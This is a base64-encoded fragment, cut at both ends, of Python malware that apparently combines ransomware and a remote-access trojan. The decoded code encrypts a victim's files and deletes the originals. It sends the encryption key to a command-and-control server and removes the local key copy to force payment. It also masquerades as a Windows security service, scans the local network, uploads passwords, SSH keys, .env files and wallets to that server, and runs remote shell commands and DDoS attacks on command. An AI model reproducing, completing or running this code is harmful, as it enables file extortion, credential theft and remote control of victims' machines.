0X2xpc3QpID09IDA6CiAgICAgICAgdGFyZ2V0X2xpc3QgPSBbVEFSR0VUX0RJUkVDVE9SWV0KICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoVEFSR0VUX0RJUkVDVE9SWSk6CiAgICAgICAgICAgIHRyeTogb3MubWFrZWRpcnMoVEFSR0VUX0RJUkVDVE9SWSkKICAgICAgICAgICAgZXhjZXB0OiBwYXNzCgogICAgIyBSZXN1bWUgZnJvbSBjcmFzaCBpZiBrZXkgYmFja3VwIGV4aXN0cwogICAgaWYgb3MucGF0aC5leGlzdHMoS0VZX0JBQ0tVUF9GSUxFKToKICAgICAgICBsb2dfZXJyb3IoIkZvdW5kIGtleSBiYWNrdXAuIFJlc3VtaW5nIGZyb20gY3Jhc2guLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgd2l0aCBvcGVuKEtFWV9CQUNLVVBfRklMRSwgJ3JiJykgYXMgZjoKICAgICAgICAgICAgICAgIHJldHVybiBmLnJlYWQoKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcyAKCiAgICAjIFNraXAgaWYgYWxyZWFkeSBlbmNyeXB0ZWQKICAgIGlmIG9zLnBhdGguZXhpc3RzKExPQ0tfRklMRSk6CiAgICAgICAgbG9nX2Vycm9yKCJFbmNyeXB0aW9uIHNlZW1pbmdseSBjb21wbGV0ZSAoTG9jayBmaWxlIGV4aXN0cykuIikKICAgICAgICByZXR1cm4gTm9uZQoKICAgIGFlc19rZXkgPSBnZW5lcmF0ZV9hZXNfa2V5KCkKICAgIAogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihLRVlfQkFDS1VQX0ZJTEUsICd3YicpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoYWVzX2tleSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBsb2dfZXJyb3IoZiJGYWlsZWQgdG8gd3JpdGUga2V5IGJhY2t1cDoge2V9IikKCiAgICAjIFNhdmUgdGFyZ2V0IGxpc3QgZm9yIGRlY3J5cHRpb24gbGF0ZXIKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oRU5DUllQVEVEX1BBVEhTX0ZJTEUsICd3JykgYXMgZjoKICAgICAgICAgICAganNvbi5kdW1wKHRhcmdldF9saXN0LCBmKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxvZ19lcnJvcihmIkZhaWxlZCB0byBzYXZlIGVuY3J5cHRlZCBwYXRoczoge2V9IikKCiAgICBlbmNyeXB0ZWRfZmlsZXMgPSAwCiAgICAKICAgICMgSXRlcmF0ZSBvdmVyIEFMTCBzZWxlY3RlZCB0YXJnZXQgZGlyZWN0b3JpZXMKICAgIGxvZ19lcnJvcihmIkVuY3J5cHRpbmcge2xlbih0YXJnZXRfbGlzdCl9IGRpcmVjdG9yaWVzLi4uIikKICAgIGZvciB0YXJnZXRfcGF0aCBpbiB0YXJnZXRfbGlzdDoKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyh0YXJnZXRfcGF0aCk6CiAgICAgICAgICAgIGZvciByb290LCBfLCBmaWxlcyBpbiBvcy53YWxrKHRhcmdldF9wYXRoKToKICAgICAgICAgICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICAgICAgICAgIGZpbGVfcGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmaWxlKQogICAgICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguc3BsaXRleHQoZmlsZSlbMV0ubG93ZXIoKSBpbiBUQVJHRVRfRVhURU5TSU9OUyBhbmQgbm90IGZpbGVfcGF0aC5lbmRzd2l0aChFTkNSWVBURURfRVhURU5TSU9OKToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZW5jcnlwdF9maWxlX2Flc19nY20oZmlsZV9wYXRoLCBhZXNfa2V5KToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlY3VyZV9kZWxldGVfZmlsZShmaWxlX3BhdGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmNyeXB0ZWRfZmlsZXMgKz0gMQoKICAgIHdpdGggb3BlbihMT0NLX0ZJTEUsICd3JykgYXMgZjoKICAgICAgICBmLndyaXRlKCJFbmNyeXB0aW9uIGNvbXBsZXRlLiIpCgogICAgbG9nX2Vycm9yKGYiRW5jcnlwdGlvbiBmaW5pc2hlZC4ge2VuY3J5cHRlZF9maWxlc30gZmlsZXMgZW5jcnlwdGVkLiIpCiAgICByZXR1cm4gYWVzX2tleQoKZGVmIGNoZWNrX2luX3dpdGhfYzIoYWVzX2tleSk6CiAgICB0cnk6CiAgICAgICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMgaW1wb3J0IHNlcmlhbGl6YXRpb24KICAgICAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5hc3ltbWV0cmljIGltcG9ydCBwYWRkaW5nCiAgICAgICAgCiAgICAgICAgcHVibGljX2tleSA9IHNlcmlhbGl6YXRpb24ubG9hZF9wZW1fcHVibGljX2tleShBVFRBQ0tFUl9QVUJMSUNfS0VZLmVuY29kZSgpLCBiYWNrZW5kPWRlZmF1bHRfYmFja2VuZCgpKQogICAgICAgIGVuY3J5cHRlZF9hZXNfa2V5ID0gcHVibGljX2tleS5lbmNyeXB0KAogICAgICAgICAgICBhZXNfa2V5LAogICAgICAgICAgICBwYWRkaW5nLk9BRVAoCiAgICAgICAgICAgICAgICBtZ2Y9cGFkZGluZy5NR0YxKGFsZ29yaXRobT1oYXNoZXMuU0hBMjU2KCkpLAogICAgICAgICAgICAgICAgYWxnb3JpdGhtPWhhc2hlcy5TSEEyNTYoKSwKICAgICAgICAgICAgICAgIGxhYmVsPU5vbmUKICAgICAgICAgICAgKQogICAgICAgICkKICAgICAgICBwYXlsb2FkID0geyJrZXkiOiBiYXNlNjQuYjY0ZW5jb2RlKGVuY3J5cHRlZF9hZXNfa2V5KS5kZWNvZGUoJ3V0Zi04Jyl9CiAgICAgICAgCiAgICAgICAgdmljdGltX2lkID0gTm9uZQogICAgICAgIGxvZ19lcnJvcihmIkF0dGVtcHRpbmcgdG8gY29ubmVjdCB0byBDMiBhdDoge0MyX1NFUlZFUl9VUkx9IikKICAgICAgICAKICAgICAgICBmb3IgXyBpbiByYW5nZSgzKToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KGYie0MyX1NFUlZFUl9VUkx9L2FwaS9jaGVja2luIiwganNvbj1wYXlsb2FkLCB0aW1lb3V0PTUpCiAgICAgICAgICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgdmljdGltX2lkID0gcmVzcG9uc2UuanNvbigpLmdldCgndmljdGltX2lkJykKICAgICAgICAgICAgICAgICAgICBsb2dfZXJyb3IoZiJDb25uZWN0ZWQhIFZpY3RpbSBJRDoge3ZpY3RpbV9pZH0iKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIGxvZ19lcnJvcihmIkNvbm5lY3Rpb24gYXR0ZW1wdCBmYWlsZWQ6IHtlfSIpCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDIpCiAgICAgICAgCiAgICAgICAgaWYgbm90IHZpY3RpbV9pZDoKICAgICAgICAgICAgIyAtLS0gT0ZGTElORSBGQUxMQkFDSyAtLS0KICAgICAgICAgICAgbG9nX2Vycm9yKCJDMiBVbnJlYWNoYWJsZS4gU3dpdGNoaW5nIHRvIE9GRkxJTkUgTU9ERS4iKQogICAgICAgICAgICAjIEdlbmVyYXRlIGEgbG9jYWwgSUQgc28gdGhlIEdVSSBzdGlsbCBsYXVuY2hlcwogICAgICAgICAgICB2aWN0aW1faWQgPSAiT0ZGTElORS0iICsgYmFzZTY0LnVybHNhZmVfYjY0ZW5jb2RlKG9zLnVyYW5kb20oNCkpLmRlY29kZSgndXRmLTgnKS5yc3RyaXAoJz0nKQogICAgICAgICAgICAKICAgICAgICAgICAgIyBTYXZlIHRoZSBrZXkgbG9jYWxseSBmb3IgbWFudWFsIHJlY292ZXJ5IGlmIG5lZWRlZCAoaW4gYSByZWFsIHNjZW5hcmlvIHRoaXMgbWlnaHQgZGlmZmVyKQogICAgICAgICAgICAjIEZvciB0aGlzIGVkdWNhdGlvbmFsL3NpbSwgd2UganVzdCBrZWVwIHRoZSBrZXkgYmFja3VwIGZpbGUgYXMgdGhlICdrZXkgc3RvcmUnCiAgICAgICAgICAgICMgb3Igd2UgY291bGQgd3JpdGUgaXQgdG8gYSBzZXBhcmF0ZSBoaWRkZW4gZmlsZS4KICAgICAgICAgICAgcGFzcwoKICAgICAgICB3aXRoIG9wZW4oSURfRklMRSwgJ3cnKSBhcyBmOgogICAgICAgICAgICBmLndyaXRlKHZpY3RpbV9pZCkKICAgICAgICAKICAgICAgICAjIElmIHdlIGFyZSBvZmZsaW5lLCB3ZSBETyBOT1QgZGVsZXRlIHRoZSBrZXkgYmFja3VwLCBzbyB3ZSBjYW4gcmVjb3ZlciBpdCBtYW51YWxseSBpZiBuZWVkZWQuCiAgICAgICAgIyBJZiB3ZSBhcmUgb25saW5lLCB3ZSBkZWxldGUgaXQgdG8gZm9yY2UgcGF5bWVudC4KICAgICAgICBpZiAiT0ZGTElORSIgbm90IGluIHZpY3RpbV9pZCBhbmQgb3MucGF0aC5leGlzdHMoS0VZX0JBQ0tVUF9GSUxFKToKICAgICAgICAgICAgIG9zLnJlbW92ZShLRVlfQkFDS1VQX0ZJTEUpCiAgICAgICAgICAgIAogICAgICAgIGxvZ19lcnJvcihmIkNoZWNrLWluIGNvbXBsZXRlLiBGaW5hbCBWaWN0aW0gSUQ6IHt2aWN0aW1faWR9IikKICAgICAgICByZXR1cm4gdmljdGltX2lkCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxvZ19lcnJvcihmIkMyIGNoZWNrLWluIGNyaXRpY2FsIGZhaWx1cmU6IHtlfSIpCiAgICAgICAgIyBVbHRpbWF0ZSBmYWxsYmFjawogICAgICAgIHJldHVybiAiQ1JJVElDQUwtRkFJTFVSRSIKCiMgLS0tIFJBVCBNT0RVTEUgRlVOQ1RJT05TIC0tLQoKIyBDaGFtZWxlb246IFByb2Nlc3MgTWFzcXVlcmFkaW5nCmRlZiBjaGFtZWxlb25fZGlzZ3Vpc2UoKToKICAgICIiIkRpc2d1aXNlIHByb2Nlc3MgbmFtZSBpbiBUYXNrIE1hbmFnZXIiIiIKICAgIHRyeToKICAgICAgICBpZiBvcy5uYW1lID09ICdudCc6CiAgICAgICAgICAgICMgV2luZG93czogU2V0IGNvbnNvbGUgdGl0bGUKICAgICAgICAgICAgY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5TZXRDb25zb2xlVGl0bGVXKCJXaW5kb3dzIFNlY3VyaXR5IFNlcnZpY2UiKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgICMgTGludXg6IFRyeSB0byByZW5hbWUgcHJvY2VzcyAocmVxdWlyZXMgc2V0cHJvY3RpdGxlKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBpbXBvcnQgc2V0cHJvY3RpdGxlCiAgICAgICAgICAgICAgICBzZXRwcm9jdGl0bGUuc2V0cHJvY3RpdGxlKCJzeXN0ZW1kLXJlc29sdmVkIikKICAgICAgICAgICAgZXhjZXB0IEltcG9ydEVycm9yOgogICAgICAgICAgICAgICAgcGFzcyAgIyBzZXRwcm9jdGl0bGUgbm90IGF2YWlsYWJsZQogICAgICAgIGxvZ19lcnJvcigiQ2hhbWVsZW9uOiBQcm9jZXNzIGRpc2d1aXNlZCIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgbG9nX2Vycm9yKGYiQ2hhbWVsZW9uIGVycm9yOiB7ZX0iKQoKIyBDYXJ0b2dyYXBoZXI6IE5ldHdvcmsgU2Nhbm5lcgpkZWYgc2Nhbl9uZXR3b3JrKCk6CiAgICAiIiJTY2FuIGxvY2FsIG5ldHdvcmsgZm9yIGxpdmUgaG9zdHMiIiIKICAgIHRyeToKICAgICAgICAjIEdldCBsb2NhbCBJUAogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ER1JBTSkKICAgICAgICBzLmNvbm5lY3QoKCI4LjguOC44IiwgODApKQogICAgICAgIGxvY2FsX2lwID0gcy5nZXRzb2NrbmFtZSgpWzBdCiAgICAgICAgcy5jbG9zZSgpCiAgICAgICAgCiAgICAgICAgIyBDYWxjdWxhdGUgc3VibmV0CiAgICAgICAgaXBfcGFydHMgPSBsb2NhbF9pcC5zcGxpdCgnLicpCiAgICAgICAgc3VibmV0ID0gZiJ7aXBfcGFydHNbMF19LntpcF9wYXJ0c1sxXX0ue2lwX3BhcnRzWzJdfSIKICAgICAgICAKICAgICAgICBsb2dfZXJyb3IoZiJDYXJ0b2dyYXBoZXI6IFNjYW5uaW5nIHtzdWJuZXR9LjAvMjQiKQogICAgICAgIAogICAgICAgIGhvc3RzID0gW10KICAgICAgICBjb21tb25fcG9ydHMgPSBbMjIsIDgwLCA0NDMsIDQ0NSwgMzM4OV0gICMgU1NILCBIVFRQLCBIVFRQUywgU01CLCBSRFAKICAgICAgICAKICAgICAgICAjIFNjYW4gZmlyc3QgMTAgSVBzIG9ubHkgKHRvIGF2b2lkIGxvbmcgZGVsYXlzKQogICAgICAgIGZvciBpIGluIHJhbmdlKDEsIDExKToKICAgICAgICAgICAgaXAgPSBmIntzdWJuZXR9LntpfSIKICAgICAgICAgICAgaWYgaXAgPT0gbG9jYWxfaXA6CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAKICAgICAgICAgICAgb3Blbl9wb3J0cyA9IFtdCiAgICAgICAgICAgIGZvciBwb3J0IGluIGNvbW1vbl9wb3J0czoKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICAgICAgICAgICAgICAgIHNvY2suc2V0dGltZW91dCgwLjUpCiAgICAgICAgICAgICAgICAgICAgcmVzdWx0ID0gc29jay5jb25uZWN0X2V4KChpcCwgcG9ydCkpCiAgICAgICAgICAgICAgICAgICAgaWYgcmVzdWx0ID09IDA6CiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW5fcG9ydHMuYXBwZW5kKHBvcnQpCiAgICAgICAgICAgICAgICAgICAgc29jay5jbG9zZSgpCiAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAKICAgICAgICAgICAgaWYgb3Blbl9wb3J0czoKICAgICAgICAgICAgICAgIGhvc3RzLmFwcGVuZCh7ImlwIjogaXAsICJwb3J0cyI6IG9wZW5fcG9ydHN9KQogICAgICAgIAogICAgICAgIGxvZ19lcnJvcihmIkNhcnRvZ3JhcGhlcjogRm91bmQge2xlbihob3N0cyl9IGhvc3RzIikKICAgICAgICByZXR1cm4gaG9zdHMKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBsb2dfZXJyb3IoZiJDYXJ0b2dyYXBoZXIgZXJyb3I6IHtlfSIpCiAgICAgICAgcmV0dXJuIFtdCgojIERhdGEgVGhpZWY6IEZpbGUgRXhmaWx0cmF0aW9uCmRlZiBleGZpbHRyYXRlX2ZpbGVzKHZpY3RpbV9pZCk6CiAgICAiIiJTY2FuIGFuZCBleGZpbHRyYXRlIGhpZ2gtdmFsdWUgZmlsZXMiIiIKICAgIHRyeToKICAgICAgICBob21lID0gb3MucGF0aC5leHBhbmR1c2VyKCJ+IikKICAgICAgICB0YXJnZXRzID0gW10KICAgICAgICAKICAgICAgICAjIEV4dGVuc2lvbnMgdG8gZ3JhYgogICAgICAgIHN0ZWFsX2V4dGVuc2lvbnMgPSB7Jy50eHQnLCAnLnBkZicsICcuZG9jJywgJy5kb2N4JywgJy54bHMnLCAnLnhsc3gnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAnLmNzdicsICcucHB0JywgJy5wcHR4JywgJy5qcGcnLCAnLnBuZycsICcuanBlZycsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICcuZW52JywgJy5wZW0nLCAnLmtleScsICcuanNvbicsICcueG1sJywgJy5zcWwnLCAnLmRiJ30KICAgICAgICAKICAgICAgICAjIEZpbGVuYW1lcyB0aGF0IGFyZSBhbHdheXMgaW50ZXJlc3RpbmcKICAgICAgICBzdGVhbF9uYW1lcyA9IHsncGFzc3dvcmRzJywgJ3Bhc3N3b3JkJywgJ2NyZWRlbnRpYWxzJywgJ3NlY3JldCcsICdzZWNyZXRzJywKICAgICAgICAgICAgICAgICAgICAgICAnY29uZmlnJywgJ2lkX3JzYScsICdpZF9lZDI1NTE5JywgJ3dhbGxldCcsICdiYWNrdXAnLAogICAgICAgICAgICAgICAgICAgICAgICcuZW52JywgJy5iYXNocmMnLCAnLmJhc2hfaGlzdG9yeScsICcuc3NoJ30KICAgICAgICAKICAgICAgICAjIERpcmVjdG9yaWVzIHRvIHNraXAKICAgICAgICBza2lwX2RpcnMgPSB7J2FwcGRhdGEnLCAnY2FjaGUnLCAnLmdpdCcsICdub2RlX21vZHVsZXMnLCAnX19weWNhY2hlX18nLAogICAgICAgICAgICAgICAgICAgICAnbG9jYWwnLCAndGVtcCcsICcudnNjb2RlJywgJy5pZGVhJ30KICAgICAgICAKICAgICAgICBsb2dfZXJyb3IoIkRhdGEgVGhpZWY6IFNjYW5uaW5nIGZvciB2YWx1YWJsZSBmaWxlcy4uLiIpCiAgICAgICAgCiAgICAgICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsoaG9tZSk6CiAgICAgICAgICAgICMgU2tpcCBoaWRkZW4vY2FjaGUgZGlyZWN0b3JpZXMKICAgICAgICAgICAgZGlyc1s6XSA9IFtkIGZvciBkIGluIGRpcnMgaWYgZC5sb3dlcigpIG5vdCBpbiBza2lwX2RpcnMgYW5kIG5vdCBkLnN0YXJ0c3dpdGgoJ19fJyldCiAgICAgICAgICAgIAogICAgICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgICAgIGZpbGVfbG93ZXIgPSBmaWxlLmxvd2VyKCkKICAgICAgICAgICAgICAgIGV4dCA9IG9zLnBhdGguc3BsaXRleHQoZmlsZV9sb3dlcilbMV0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgIyBNYXRjaCBieSBleHRlbnNpb24gT1IgYnkga2V5d29yZCBpbiBmaWxlbmFtZQogICAgICAgICAgICAgICAgc2hvdWxkX3N0ZWFsID0gKGV4dCBpbiBzdGVhbF9leHRlbnNpb25zIG9yIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYW55KGt3IGluIGZpbGVfbG93ZXIgZm9yIGt3IGluIHN0ZWFsX25hbWVzKSkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgc2hvdWxkX3N0ZWFsOgogICAgICAgICAgICAgICAgICAgIGZpbGVfcGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmaWxlKQogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgc2l6ZSA9IG9zLnBhdGguZ2V0c2l6ZShmaWxlX3BhdGgpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIDAgPCBzaXplIDwgNTAwMDAwOiAgIyBGaWxlcyBiZXR3ZWVuIDAgYW5kIDUwMEtCCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXJnZXRzLmFwcGVuZChmaWxlX3BhdGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4odGFyZ2V0cykgPj0gMzA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgaWYgbGVuKHRhcmdldHMpID49IDMwOgogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAKICAgICAgICBsb2dfZXJyb3IoZiJEYXRhIFRoaWVmOiBGb3VuZCB7bGVuKHRhcmdldHMpfSB2YWx1YWJsZSBmaWxlcyIpCiAgICAgICAgCiAgICAgICAgIyBVcGxvYWQgZmlsZXMgdG8gQzIKICAgICAgICBmb3IgZmlsZV9wYXRoIGluIHRhcmdldHM6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyYicpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgY29udGVudCA9IGYucmVhZCgpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiBvcy5wYXRoLmJhc2VuYW1lKGZpbGVfcGF0aCksCiAgICAgICAgICAgICAgICAgICAgInBhdGgiOiBmaWxlX3BhdGgsCiAgICAgICAgICAgICAgICAgICAgImRhdGFfYjY0IjogYmFzZTY0LmI2NGVuY29kZShjb250ZW50KS5kZWNvZGUoKSwKICAgICAgICAgICAgICAgICAgICAic2l6ZSI6IGxlbihjb250ZW50KQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByZXF1ZXN0cy5wb3N0KGYie0MyX1NFUlZFUl9VUkx9L2FwaS9leGZpbC97dmljdGltX2lkfSIsIGpzb249ZGF0YSwgdGltZW91dD01KQogICAgICAgICAgICAgICAgbG9nX2Vycm9yKGYiRGF0YSBUaGllZjogRXhmaWx0cmF0ZWQge2RhdGFbJ25hbWUnXX0iKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBsb2dfZXJyb3IoZiJEYXRhIFRoaWVmOiBGYWlsZWQgdG8gZXhmaWwge2ZpbGVfcGF0aH06IHtlfSIpCiAgICAgICAgCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgbG9nX2Vycm9yKGYiRGF0YSBUaGllZiBlcnJvcjoge2V9IikKCiMgUG9sdGVyZ2Vpc3QgKyBab21iaWU6IFJBVCBDb21tYW5kIExvb3AKY2xhc3MgUkFUQ29tbWFuZExvb3A6CiAgICAiIiJIYW5kbGVzIHJlbW90ZSBjb21tYW5kIGV4ZWN1dGlvbiBhbmQgRERvUyBib3QiIiIKICAgIGRlZiBfX2luaXRfXyhzZWxmLCB2aWN0aW1faWQpOgogICAgICAgIHNlbGYudmljdGltX2lkID0gdmljdGltX2lkCiAgICAgICAgc2VsZi5zdG9wX2V2ZW50ID0gdGhyZWFkaW5nLkV2ZW50KCkKICAgICAgICBzZWxmLmRkb3NfdGhyZWFkcyA9IFtdCiAgICAgICAgc2VsZi5kZG9zX2FjdGl2ZSA9IEZhbHNlCiAgICAgICAgc2VsZi5jd2QgPSBvcy5wYXRoLmV4cGFuZHVzZXIoIn4iKSAgIyBUcmFjayB3b3JraW5nIGRpcmVjdG9yeSBwZXJzaXN0ZW50bHkKICAgIAogICAgZGVmIHN0YXJ0KHNlbGYpOgogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYuY29tbWFuZF9sb29wLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQogICAgICAgIGxvZ19lcnJvcigiUkFUIENvbW1hbmQgTG9vcCBzdGFydGVkIikKICAgIAogICAgZGVmIGNvbW1hbmRfbG9vcChzZWxmKToKICAgICAgICAiIiJQb2xsIEMyIGZvciBjb21tYW5kcyIiIgogICAgICAgIHdoaWxlIG5vdCBzZWxmLnN0b3BfZXZlbnQuaXNfc2V0KCk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJlc3AgPSByZXF1ZXN0cy5nZXQoZiJ7QzJfU0VSVkVSX1VSTH0vYXBpL3JhdF9jb21tYW5kL3tzZWxmLnZpY3RpbV9pZH0iLCB0aW1lb3V0PTUpCiAgICAgICAgICAgICAgICBpZiByZXNwLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgICAgICBjbWQgPSByZXNwLmpzb24oKQogICAgICAgICAgICAgICAgICAgIGNtZF90eXBlID0gY21kLmdldCgndHlwZScpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgY21kX3R5cGUgPT0gJ3NoZWxsJzoKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leGVjdXRlX3NoZWxsKGNtZC5nZXQoJ2NtZCcpKQogICAgICAgICAgICAgICAgICAgIGVsaWYgY21kX3R5cGUgPT0gJ2Rkb3Nfc3RhcnQnOgogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnN0YXJ0X2Rkb3MoY21kLmdldCgndGFyZ2V0JykpCiAgICAgICAgICAgICAgICAgICAgZWxpZiBjbWRfdHlwZSA9PSAnZGRvc19zdG9wJzoKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5zdG9wX2Rkb3MoKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBwYXNzICAjIFNpbGVudCBmYWlsLCBrZWVwIHBvbGxpbmcKICAgICAgICAgICAgCiAgICAgICAgICAgIHRpbWUuc2xlZXAoNSkKICAgIAogICAgZGVmIGV4ZWN1dGVfc2hlbGwoc2VsZiwgY21kKToKICAgICAgICAiIiJFeGVjdXRlIHNoZWxsIGNvbW1hbmQgYW5kIHNlbmQgb3V0cHV0IGJhY2siIiIKICAgICAgICB0cnk6CiAgICAgICAgICAgICMgSGFuZGxlICdjZCcgY29tbWFuZCDigJQgdXBkYXRlIHBlcnNpc3RlbnQgd29ya2luZyBkaXJlY3RvcnkKICAgICAgICAgICAgc3RyaXBwZWQgPSBjbWQuc3RyaXAoKQogICAgICAgICAgICBpZiBzdHJpcHBlZCA9PSAnY2QnIG9yIHN0cmlwcGVkLnN0YXJ0c3dpdGgoJ2NkICcpOgogICAgICAgICAgICAgICAgaWYgc3RyaXBwZWQgPT0gJ2NkJzoKICAgICAgICAgICAgICAgICAgICBuZXdfZGlyID0gb3MucGF0aC5leHBhbmR1c2VyKCJ+IikKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgbmV3X2RpciA9IHN0cmlwcGVkWzM6XS5zdHJpcCgpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICMgUmVzb2x2ZSByZWxhdGl2ZSBwYXRocyBmcm9tIGN1cnJlbnQgY3dkCiAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2FicyhuZXdfZGlyKToKICAgICAgICAgICAgICAgICAgICBuZXdfZGlyID0gb3MucGF0aC5qb2luKHNlbGYuY3dkLCBuZXdfZGlyKQogICAgICAgICAgICAgICAgbmV3X2RpciA9IG9zLnBhdGgubm9ybXBhdGgobmV3X2RpcikKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2RpcihuZXdfZGlyKToKICAgICAgICAgICAgICAgICAgICBzZWxmLmN3ZCA9IG5ld19kaXIKICAgICAgICAgICAgICAgICAgICBvdXRwdXQgPSBmIkNoYW5nZWQgZGlyZWN0b3J5IHRvOiB7c2VsZi5jd2R9IgogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBvdXRwdXQgPSBmImNkOiBubyBzdWNoIGRpcmVjdG9yeToge25ld19kaXJ9IgogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByZXF1ZXN0cy5wb3N0KAogICAgICAgICAgICAgICAgICAgIGYie0MyX1NFUlZFUl9VUkx9L2FwaS9yYXRfb3V0cHV0L3tzZWxmLnZpY3RpbV9pZH0iLAogICAgICAgICAgICAgICAgICAgIGpzb249eyJjbWQiOiBjbWQsICJvdXRwdXQiOiBvdXRwdXR9LAogICAgICAgICAgICAgICAgICAgIHRpbWVvdXQ9NQogICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIAogICAgICAgICAgICAjIFJlZ3VsYXIgY29tbWFuZCDigJQgcnVuIGZyb20gcGVyc2lzdGVudCBjd2QKICAgICAgICAgICAgcmVzdWx0ID0gc3VicHJvY2Vzcy5ydW4oCiAgICAgICAgICAgICAgICBjbWQsIHNoZWxsPVRydWUsIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1ZSwgCiAgICAgICAgICAgICAgICB0aW1lb3V0PTE1LCBjd2Q9c2VsZi5jd2QKICAgICAgICAgICAgKQogICAgICAgICAgICAKICAgICAgICAgICAgb3V0cHV0ID0gcmVzdWx0LnN0ZG91dCArIHJlc3VsdC5zdGRlcnIKICAgICAgICAgICAgaWYgbm90IG91dHB1dDoKICAgICAgICAgICAgICAgIG91dHB1dCA9ICIoTm8gb3V0cHV0KSIKICAgICAgICAgICAgCiAgICAgICAgICAgICMgU2VuZCBiYWNrIHRvIEMyICh1cCB0byAyMDAwIGNoYXJzIGZvciB1c2VmdWwgb3V0cHV0KQogICAgICAgICAgICByZXF1ZXN0cy5wb3N0KAogICAgICAgICAgICAgICAgZiJ7QzJfU0VSVkVSX1VSTH0vYXBpL3JhdF9v